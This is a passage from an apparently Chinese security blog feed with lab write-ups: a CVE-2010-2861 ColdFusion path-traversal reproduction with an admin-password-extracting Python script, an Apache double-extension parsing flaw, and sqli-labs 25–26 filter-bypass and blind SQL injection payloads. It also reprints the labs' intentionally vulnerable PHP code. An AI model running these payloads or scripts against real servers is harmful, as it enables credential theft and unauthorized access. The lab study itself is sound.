            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2010-2861 recurrent</title>
      <link href="/posts/81167905.html"/>
      <url>/posts/81167905.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。<br><img src="http://i1.hdslb.com/bfs/archive/4d62985cf8d97cf16775552450e995f622ac543c.jpg" alt="4d62985cf8d97cf16775552450e995f622ac543c.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>从<a href="https://vulhub.org/#/environments/coldfusion/CVE-2010-2861/" target="_blank" rel="noopener">Vulhub - Docker-Compose file for vulnerability environment</a>下载好docker环境找到对应的CVE环境然后执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>之后访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8500/</span><br></pre></td></tr></table></figure></p><p>看到以下：<br><img src="https://s2.ax1x.com/2019/01/26/kuEBb4.png" alt="kuEBb4.png"></p><p>直接访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">读取/etc/passwd :http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</span><br><span class="line">读取管理员密码：&lt;http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</span><br></pre></td></tr></table></figure></p><p>即可读取文件</p><p>简单的漏洞检测脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;&apos;</span><br><span class="line">author:九世</span><br><span class="line">time:2019/1/26</span><br><span class="line">source:https://vulhub.org/#/environments/coldfusion/CVE-2010-2861/</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def exploit(url):</span><br><span class="line">    payload=&apos;/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en&apos;</span><br><span class="line">    guanjianzi=&apos;/bin/bash&apos;</span><br><span class="line">    payload2=&apos;/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en&apos;</span><br><span class="line">    urls=str(url).rstrip(&apos;/&apos;).strip()+payload</span><br><span class="line">    urls2=str(url).rstrip(&apos;/&apos;).strip()+payload2</span><br><span class="line">    headers=&#123;&apos;user-agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&apos;&#125;</span><br><span class="line">    try:</span><br><span class="line">        rqt=requests.get(url=urls,headers=headers,timeout=10)</span><br><span class="line">        if guanjianzi in rqt.text:</span><br><span class="line">            id=1</span><br><span class="line">            print(&apos;[+] Found CVE-2010-2861&apos;)</span><br><span class="line">        else:</span><br><span class="line">            id=0</span><br><span class="line">            print(&apos;[-] Not Found CVE-2018-2861&apos;)</span><br><span class="line">        uuid=id</span><br><span class="line">        if uuid&gt;0:</span><br><span class="line">            rqs=requests.get(url=urls2,headers=headers,timeout=10)</span><br><span class="line">            passwd=re.findall(&apos;password=[0-9-A-Z].*&apos;,rqs.text)</span><br><span class="line">            print(&apos;[+] administrator password:&#123;&#125;&apos;.format(passwd[0]))</span><br><span class="line">    except Exception as r:</span><br><span class="line">        print(&apos;[!] Error &#123;&#125;&apos;.format(r))</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/26/kuVBSP.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/01/26/kuEHPI.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/01/26/kuVRFs.png" alt="kuVRFs.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Apache parsing vulnerability</title>
      <link href="/posts/112bbe18.html"/>
      <url>/posts/112bbe18.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>apache由于本身的多特性，造就了他不同的功能。但是如果管理员在对apache的配置设置错误的情况下将造成，解析漏洞。<br><img src="http://p3.pstatp.com/large/pgc-image/152514651210377bf79f316" alt="152514651210377bf79f316"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>一般文件上传漏洞使用白名单的话一般没什么问题。但是如果由于目标使用的web容器配置错误那么就会造成解析漏洞，让攻击者有机可乘。</p><p>Apache如果在配置文件下面加了如下的配置就会造成解析漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure></p><p>加入了这个配置之后，上传一个名为xx.php.jpg的文件。访问后会直接进行解析：<br><img src="https://s2.ax1x.com/2019/01/26/kn8xRe.md.png" alt="kn8xRe.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs Less 25-sqli-labs Less 26a</title>
      <link href="/posts/3c935757.html"/>
      <url>/posts/3c935757.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从sqli-labs25关撸到了26a，这机关撸的我心态爆炸。真的恐怖如斯斗气化马<br><img src="http://gogonews.cc/article/img/2018/07/13/cZA1vO3t6f0dOM5/6Yc87k158En6.jpg" alt="6Yc87k158En6.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>fofa找的练习环境：<a href="http://118.24.125.87:8000" target="_blank" rel="noopener">SQL Injections</a><br>windows环境和Linux有不同的方法，由于有些可以代替空格的url编码在windows的Apache不启作用。这里我用Linux做环境，当然你也可以去fofa找在线的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-25 Trick with OR &amp; AND&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">//fiddling with comments</span><br><span class="line">$id= blacklist($id); /*黑名单里面过滤了and和or*/</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//echo $id;</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$hint=$id;</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">echo &quot;Please input the ID as parameter with numeric value&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);//strip out OR (non case sensitive)</span><br><span class="line">$id= preg_replace(&apos;/AND/i&apos;,&quot;&quot;, $id);//Strip out AND (non case sensitive)</span><br><span class="line"></span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-25.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-25-1.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=&apos;4&apos; color= &quot;#33FFFF&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>从审计第25关的代码可以看到，过滤了and和or，但是正则只对and和or替换为空。只要把过滤的进行双写即可绕过过滤。<br>(只要想办法被他过滤后还能拼接出被过滤的词就ok了)</p><p><b>第25关</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anandd oorr</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/25/kevJAg.md.png" alt="kevJAg.md.png"></p><p>实际测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ anandd 1=1 --+</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/25/kevwj0.png" alt="kevwj0.png"></p><p>报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; anandd updatexml(1,concat(0x7e,(select user()),0x7e),1) --+</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/25/kevR3R.md.png" alt="kevR3R.md.png"></p><p>这里要注意一点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注入的时候information里面的or记得双写，我纠结了半天。。我以为我打错了。。我丢</span><br></pre></td></tr></table></figure></p><p><b>第25a关</b><br>审计代码先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-25a Trick with OR &amp; AND Blind&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:60px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// take the variables</span><br><span class="line">if(isset($_GET[&apos;id&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">//fiddling with comments</span><br><span class="line">$id= blacklist($id); /*过滤不变*/</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//echo $id;</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$hint=$id;</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;  /*查询方式变了*/</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">//echo &apos;YOU ARE IN ........&apos;;  </span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">//echo &apos;You are in...........&apos;;</span><br><span class="line">//print_r(mysql_error()); /*关闭了输入mysql的报错*/</span><br><span class="line">//echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">echo &quot;Please input the ID as parameter with numeric value&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);//strip out OR (non case sensitive)</span><br><span class="line">$id= preg_replace(&apos;/AND/i&apos;,&quot;&quot;, $id);//Strip out AND (non case sensitive)</span><br><span class="line"></span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-25a.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-25a-1.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=&apos;4&apos; color= &quot;#33FFFF&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>由于25a把输出mysql错误的语句关闭了，所以我们只能盲注了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20anandd%20sleep(if((length(database())=8),1,4))</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/25/kexfiQ.md.png" alt="kexfiQ.md.png"></p><p><b>第26关</b><br>审计代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-26 Trick with comments&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&apos;id&apos;])) /*判断GET请求变量ID是否存在*/</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;); /*写入日志*/</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">//fiddling with comments</span><br><span class="line">$id= blacklist($id); /*黑名单替换，返回的id*/</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//echo $id;</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$hint=$id;</span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;</span><br><span class="line">  echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);//strip out OR (non case sensitive)</span><br><span class="line">$id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);//Strip out AND (non case sensitive)</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #</span><br><span class="line">$id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);//Strip out spaces</span><br><span class="line">$id= preg_replace(&apos;/[\/\\\\]/&apos;,&quot;&quot;, $id);//Strip out slashes</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-26.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-26-1.jpg&quot; /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=&apos;4&apos; color= &quot;#33FFFF&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span 